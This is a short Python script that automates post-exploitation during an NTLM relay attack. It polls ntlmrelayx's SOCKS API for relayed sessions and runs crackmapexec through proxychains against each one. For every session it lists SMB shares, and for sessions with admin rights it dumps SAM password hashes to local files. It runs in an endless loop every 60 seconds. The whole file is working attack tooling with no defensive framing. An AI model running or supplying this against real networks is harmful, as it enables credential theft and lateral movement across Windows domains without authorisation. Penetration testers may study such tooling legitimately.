import requests, os, time
from pathlib import Path
from enum import Enum

CRACKMAPEXEC_DUMP_HASHES = 1
CRACKMAPEXEC_LIST_DIRECTORIES = 2
DELAY_BETWEEN_EACH_CYCLE_IN_SECONDS=60

def GetSocks():
    request = requests.get("http://localhost:9090/ntlmrelayx/api/v1.0/relays")
    socks = request.json()
    adminSocks = []
    for sock in socks:
        ipAddress = sock[1]
        domain = sock[2].split("/")[0]
        username = sock[2].split("/")[1]
        isAdmin = sock[3] == "TRUE"
        sessionId = f'{ipAddress}{domain}{username}{isAdmin}'
        adminSocks.append({"domain":domain, "username":username, "ipAddress":ipAddress, "isAdmin" : isAdmin, "sessionId": sessionId})

    return adminSocks

def ListDirectories(sock):
    RunCrackmapExec(sock["domain"], sock["username"], sock["ipAddress"], CRACKMAPEXEC_LIST_DIRECTORIES)

def DumpHashes(sock):
    if not (sock["isAdmin"]):
        return
    RunCrackmapExec(sock["domain"], sock["username"], sock["ipAddress"], CRACKMAPEXEC_DUMP_HASHES)

def RunCrackmapExec(domain, username, ipAddress, typeOfCommand):

    directory = ""
    filenameEnding = ""
    crackmapexecParameter = ""
    message = ""
    if typeOfCommand == CRACKMAPEXEC_DUMP_HASHES:
        directory = "hashes"
        filenameEnding = "hashes"
        crackmapexecParameter = "--sam"
        message = f"Dumping hashes for {ipAddress} using {domain}/{username}"
    elif typeOfCommand == CRACKMAPEXEC_LIST_DIRECTORIES:
        directory = "shares"
        filenameEnding = "shares"
        crackmapexecParameter = "--shares"
        message = f'Listing directories for {ipAddress} using {domain}/{username}'

    directoryOnDisk = Path(directory)

    if not directoryOnDisk.is_dir():
        os.mkdir(directory)

    filename = f"{directory}/dump_{ipAddress}_{username}_{filenameEnding}.txt"
    fileOnDisk = Path(filename)

    if fileOnDisk.exists():
        return

    print(message)
    command = f"proxychains -q crackmapexec smb {ipAddress} -d '{domain}' -u '{username}' -p '' {crackmapexecParameter} > {filename}"
    os.system(command)

def Main():

    while True:
        print("Getting all socks from NTLMRELAYX")
        socks = GetSocks()

        if len(socks) > 0:
            for sock in socks:
                ListDirectories(sock)
                DumpHashes(sock)
        else:
            print("There are no socks available")

        time.sleep(DELAY_BETWEEN_EACH_CYCLE_IN_SECONDS)

Main()
